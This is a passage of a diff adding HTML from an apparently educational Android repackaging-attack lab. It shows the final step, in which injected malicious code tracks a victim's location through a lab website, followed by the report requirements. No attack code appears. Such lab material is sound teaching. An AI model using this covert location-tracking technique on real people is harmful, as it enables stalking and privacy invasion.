+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>[backgroundcolor=]
+  Settings -&gt; date and time -&gt; set time
+</pre></div>
+</div>
+</div>
+<div class="section" id="step-6-tracking-the-victim">
+<h3>Step 6: Tracking the victim.<a class="headerlink" href="#step-6-tracking-the-victim" title="Permalink to this headline">¶</a></h3>
+<p>Once the malicious code is triggered, we can go back to our Ubuntu VM,
+load <a class="reference external" href="http://www.repackagingattacklab.com">http://www.repackagingattacklab.com</a> into our Firefox browser. If
+your attack is successful, you should be able to track the victim of the
+Android VM. You can go to the mock location app to change to a different
+city, and see whether your malicious code can correctly track the
+victim’s movement. Please describe your observations.</p>
+</div>
+</div>
+<div class="section" id="submission-and-demonstration">
+<h2>Submission and Demonstration<a class="headerlink" href="#submission-and-demonstration" title="Permalink to this headline">¶</a></h2>
+<p>You need to submit a detailed lab report to describe what you have done
+and what you have observed, including screenshots and code snippets (if
+needed). You also need to provide explanation to the observations that
+are interesting or surprising. You are encouraged to pursue further
+investigation, beyond what is required by the lab description.</p>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+        <a href="rooting.html" class="btn btn-neutral float-right" title="Android Device Rooting Lab" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+        <a href="click_jacking.html" class="btn btn-neutral float-left" title="Clickjacking Attack Lab" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &#169; Copyright 2021, NEXUS Lab.
+
+    </p>
+  </div>
+    
+    
+    
+    Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    
+    provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
